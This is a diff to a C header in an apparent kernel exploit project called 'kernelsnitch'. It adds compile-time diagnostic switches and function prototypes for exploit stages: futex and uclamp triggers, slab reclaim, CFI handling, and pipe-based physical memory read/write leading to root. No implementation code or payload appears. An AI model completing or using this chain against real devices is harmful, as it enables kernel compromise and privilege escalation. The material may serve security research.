@@ -40,6 +40,109 @@
 
 #include "kernelsnitch/utils.h"
 
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+void rmg_diag_checkpoint_reset(void);
+void rmg_diag_checkpoint_defer(int defer);
+void rmg_diag_checkpoint(const char *stage, unsigned long long value1,
+                         unsigned long long value2);
+void rmg_diag_checkpoint_text(const char *stage,
+                              unsigned long long value1,
+                              unsigned long long value2,
+                              const char *text);
+#endif
+
+/* Instrument the controlled mm collector without selecting the separate
+ * mmcollect-only run mode in main.c. */
+#if (defined(RMG_DIAG_CONTROLLED_MM) && RMG_DIAG_CONTROLLED_MM) || \
+    (defined(RMG_DIAG_CONTROLLED_MM_TRACE) && RMG_DIAG_CONTROLLED_MM_TRACE)
+#define RMG_DIAG_CONTROLLED_MM_TRACE_ACTIVE 1
+#else
+#define RMG_DIAG_CONTROLLED_MM_TRACE_ACTIVE 0
+#endif
+
+#if defined(RMG_DIAG_CONTROLLED_RECLAIM_ONLY) && \
+    RMG_DIAG_CONTROLLED_RECLAIM_ONLY && \
+    (!defined(RMG_DIAG_DURABLE_LOG) || !RMG_DIAG_DURABLE_LOG)
+#error "controlled-reclaim-only diagnostic requires durable checkpoints"
+#endif
+
+#ifndef RMG_DIAG_MM_CHILD_TIMEOUT_MS
+#define RMG_DIAG_MM_CHILD_TIMEOUT_MS 45000
+#endif
+#ifndef RMG_DIAG_MM_SCAN_TIMEOUT_MS
+#define RMG_DIAG_MM_SCAN_TIMEOUT_MS 180000
+#endif
+#ifndef RMG_DIAG_PIPE_PHYSRW_ONLY
+#define RMG_DIAG_PIPE_PHYSRW_ONLY 0
+#endif
+#ifndef RMG_DIAG_PIPE_AFTER_CFI_CONTINUE
+#define RMG_DIAG_PIPE_AFTER_CFI_CONTINUE 0
+#endif
+#ifndef RMG_DIAG_PIPE_AFTER_CFI
+#define RMG_DIAG_PIPE_AFTER_CFI 0
+#endif
+#ifndef RMG_DIAG_PIPE_RECLAIM_TRACE
+#define RMG_DIAG_PIPE_RECLAIM_TRACE 0
+#endif
+#ifndef RMG_DIAG_PIPE_PHYSRW_PROOF_AFTER_CORRELATION
+#define RMG_DIAG_PIPE_PHYSRW_PROOF_AFTER_CORRELATION 0
+#endif
+#if defined(RMG_DIAG_FOPS_READBACK_ONLY) && RMG_DIAG_FOPS_READBACK_ONLY && \
+    ((!defined(RMG_DIAG_CFI_ONLY) || !RMG_DIAG_CFI_ONLY) && \
+     (!defined(RMG_DIAG_UCLAMP_TRIGGER_ONLY) || \
+      !RMG_DIAG_UCLAMP_TRIGGER_ONLY)) || \
+    (defined(RMG_DIAG_FOPS_READBACK_ONLY) && RMG_DIAG_FOPS_READBACK_ONLY && \
+     (!defined(RMG_DIAG_DURABLE_LOG) || !RMG_DIAG_DURABLE_LOG))
+#error "FOPS readback requires a bounded diagnostic and durable checkpoints"
+#endif
+#if defined(RMG_DIAG_UCLAMP_TRIGGER_ONLY) && RMG_DIAG_UCLAMP_TRIGGER_ONLY && \
+    (!defined(RMG_DIAG_PI_PROBE_ONLY) || !RMG_DIAG_PI_PROBE_ONLY || \
+     !defined(RMG_DIAG_FOPS_READBACK_ONLY) || !RMG_DIAG_FOPS_READBACK_ONLY || \
+     !defined(RMG_DIAG_DURABLE_LOG) || !RMG_DIAG_DURABLE_LOG)
+#error "uclamp trigger diagnostic requires PI-probe, fops-readback, and durable-log guards"
+#endif
+#if defined(RMG_DIAG_CONTROLLED_MM) && RMG_DIAG_CONTROLLED_MM && \
+    (!defined(RMG_DIAG_DURABLE_LOG) || !RMG_DIAG_DURABLE_LOG)
+#error "controlled-mm-only diagnostic requires durable checkpoints"
+#endif
+#if defined(RMG_DIAG_LOAD_ONLY) && RMG_DIAG_LOAD_ONLY && \
+    (!defined(APP_PAYLOAD) || !APP_PAYLOAD || \
+     !defined(RMG_DIAG_DURABLE_LOG) || !RMG_DIAG_DURABLE_LOG)
+#error "load-only diagnostic requires an app payload with durable checkpoints"
+#endif
+#if defined(RMG_DIAG_LOAD_ONLY) && RMG_DIAG_LOAD_ONLY && \
+    ((defined(RMG_DIAG_CONTROLLED_MM) && RMG_DIAG_CONTROLLED_MM) || \
+     (defined(RMG_DIAG_CONTROLLED_RECLAIM_ONLY) && \
+      RMG_DIAG_CONTROLLED_RECLAIM_ONLY) || \
+     (defined(RMG_DIAG_UCLAMP_TRIGGER_ONLY) && \
+      RMG_DIAG_UCLAMP_TRIGGER_ONLY) || \
+     (defined(RMG_DIAG_CFI_ONLY) && RMG_DIAG_CFI_ONLY) || \
+     (defined(RMG_DIAG_PIPE_HANDOFF) && RMG_DIAG_PIPE_HANDOFF))
+#error "load-only diagnostic cannot be combined with an exploit route"
+#endif
+#if defined(RMG_DIAG_CFI_ONLY) && RMG_DIAG_CFI_ONLY && \
+    (!RMG_DIAG_PIPE_AFTER_CFI || RMG_DIAG_PIPE_AFTER_CFI_CONTINUE || \
+     RMG_DIAG_PIPE_PHYSRW_ONLY)
+#error "CFI-only diagnostic must stop after CFI and before pipe physrw/root"
+#endif
+
+#if defined(RMG_DIAG_FDSET_PREFLIGHT_ONLY) && \
+    RMG_DIAG_FDSET_PREFLIGHT_ONLY && \
+    (!defined(APP_PAYLOAD) || !APP_PAYLOAD || \
+     !defined(RMG_DIAG_PI_PROBE_ONLY) || !RMG_DIAG_PI_PROBE_ONLY || \
+     !defined(RMG_DIAG_DURABLE_LOG) || !RMG_DIAG_DURABLE_LOG || \
+     (defined(RMG_DIAG_CFI_ONLY) && RMG_DIAG_CFI_ONLY) || \
+     (defined(RMG_DIAG_UCLAMP_TRIGGER_ONLY) && \
+      RMG_DIAG_UCLAMP_TRIGGER_ONLY) || \
+     (defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE) || \
+     (defined(RMG_DIAG_CONTROLLED_MM) && RMG_DIAG_CONTROLLED_MM) || \
+     (defined(RMG_DIAG_CONTROLLED_RECLAIM_ONLY) && \
+      RMG_DIAG_CONTROLLED_RECLAIM_ONLY) || \
+     (defined(RMG_DIAG_PIPE_HANDOFF) && RMG_DIAG_PIPE_HANDOFF) || \
+     (defined(RMG_DIAG_LOAD_ONLY) && RMG_DIAG_LOAD_ONLY))
+#error "FD-set preflight requires an app payload, PI-probe stop, durable logs, and no later trigger"
+#endif
+
 #define KERNEL_PAGE_SETUP_ATTEMPTS 6
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
 #define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 2
@@ -349,6 +452,7 @@ long futex_op(
     const struct timespec *timeout, uint32_t *uaddr2, uint32_t val3);
 long sched_setattr_tid(int tid, int nice_value);
 long sched_setattr_tid_nochange(int tid);
+long sched_setattr_tid_uclamp_nochange(int tid);
 int try_cache_ashmem_path(const char *path);
 int same_rdev_path(const char *path, dev_t rdev);
 void init_ashmem_path(void);
@@ -387,6 +491,9 @@ uintptr_t prepare_good_kernel_page(int payload_mode);
 int collect_controlled_mm_slab_page(
     uintptr_t *base_out, int target_fds[], int *buddy_guard_fd_out,
     uintptr_t *buddy_base_out);
+#if RMG_DIAG_CONTROLLED_MM_TRACE_ACTIVE
+int run_mm_collection_diagnostic(void);
+#endif
 int release_controlled_mm_slab_page(
     int target_fds[], int *anchor_fd_out, unsigned long *slabs_before_out);
 unsigned long controlled_mm_slab_count(void);
@@ -455,6 +562,10 @@ int pipe_phys_write_data(
 uint64_t pipe_read64(int fd, uintptr_t direct_addr);
 int pipe_write64(int fd, uintptr_t direct_addr, uint64_t value);
 int install_pipe_physrw(int fd);
+int run_pipe_reclaim_diagnostic(int fd);
+#if RMG_DIAG_PIPE_RECLAIM_TRACE
+int run_pipe_reclaim_physrw_diagnostic(int fd);
+#endif
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
 int prepare_p0_pipe_oracle(void);
 int expand_p0_pipe_oracle(void);
